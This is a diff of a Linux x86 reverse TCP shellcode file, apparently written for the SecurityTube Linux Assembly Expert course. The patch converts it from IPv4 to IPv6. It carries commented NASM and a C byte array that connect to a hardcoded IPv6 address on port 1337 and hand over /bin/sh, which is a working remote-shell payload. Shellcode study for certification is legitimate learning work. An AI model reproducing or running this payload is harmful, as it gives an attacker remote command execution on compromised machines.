@@ -1,11 +1,11 @@
 /*
 # Exploit Title: Linux x86 Dual Network Stack (IPv4) Reverse TCP Shellcode
-# Date: 2018-08-25
+# Date: 2018-08-26
 # Shellcode Author: Kevin Kirsche
 # Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_2-reverse_shell
 # Tested on: Shell on Ubuntu 18.04 with gcc 7.3.0 / Connecting to Kali 2018.2
 
-# This shellcode will connect to 127.1.1.1 (to avoid nulls) on port 1337 and give you /bin/sh
+# This shellcode will connect to fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509 on port 1337 and give you /bin/sh
 
 This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
@@ -25,32 +25,40 @@ Commented NASM:
     xor ebx, ebx
     ;; arguments
     push ebx          ; #define IP_PROTO 0
-    push 0x1          ; #define SOCK_STREAM 1
-    push 0x2          ; #define PF_INET 2
+    inc ebx
+    push ebx          ; #define SOCK_STREAM 1
+    push 0xa          ; #define PF_INET6 10
     ;; function
     mov ecx, esp      ; pointer to args on the stack into ecx
     push 0x66
     pop eax           ; socketcall 0x66 == 102
-    inc ebx           ; #define SYS_SOCKET 1
     ;; call
     int 0x80
     ;; returned data
     xchg esi, eax     ; sockfd eax -> esi
 
-    ; connect ipv4
-    ;; v4rhost struct
-    inc ebx           ; 0x1 becomes 0x2 (PF_INET_
-    push 0x0101017F   ; v4rhost.sin_addr.s_addr = 127.0.0.1
-    push word 0x3905  ; v4rhost.sin_port = htons(1337)
-    push bx           ; v4rhost.sin_family = 0x2 (AF_INET)
+    ; connect ipv6
+    ;; cleanup
+    cdq
+    ;; v6rhost struct
+    push dword edx    ; v6rhost.sin6_scope_id
+    ;; the address fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509
+    push dword 0x09553dad
+    push dword 0xa923b761
+    push dword 0x02102b5a
+    push dword 0xa54b15fd
+    push edx          ; v6rhost.sin6_flowinfo
+    push word 0x3905  ; v6rhost.sin6_port = htons(1337)
+    push word 0xa     ; v6rhost.sin6_family = 0xa (AF6_INET)
     ;; arguments
-    inc ebx           ; 0x2 becomes 0x3 (SYS_CONNECT)
     mov ecx, esp      ; move our struct pointer into ECX
-    push 0x10         ; sizeof v4rhost
-    push ecx          ; pointer v4rhost
+    push 0x1c         ; sizeof v6rhost
+    push ecx          ; pointer v6rhost
     push esi          ; push sockfd onto the stack
     ;; function
     mov ecx, esp      ; pointer to args on the stack into ecx
+    inc ebx
+    inc ebx           ; #define SYS_CONNECT 3
     push 0x66         ; socketcall()
     pop eax
     ;; call
@@ -86,9 +94,10 @@ Commented NASM:
 #include <stdio.h>
 #include <string.h>
 
-unsigned char code[] = "\x31\xdb\x53\x6a\x01\x6a\x02\x89\xe1\x6a\x66\x58\x43"
-  "\xcd\x80\x96\x43\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x66\x53\x43\x89\xe1"
-  "\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd\x80\x87\xde\x29\xc9\xb1\x02\xb0"
+unsigned char code[] = "\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd"
+  "\x80\x96\x99\x52\x68\xad\x3d\x55\x09\x68\x61\xb7\x23\xa9\x68\x5a\x2b\x10"
+  "\x02\x68\xfd\x15\x4b\xa5\x52\x66\x68\x05\x39\x66\x6a\x0a\x89\xe1\x6a\x1c"
+  "\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x87\xde\x29\xc9\xb1\x02\xb0"
   "\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
   "\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80";
 
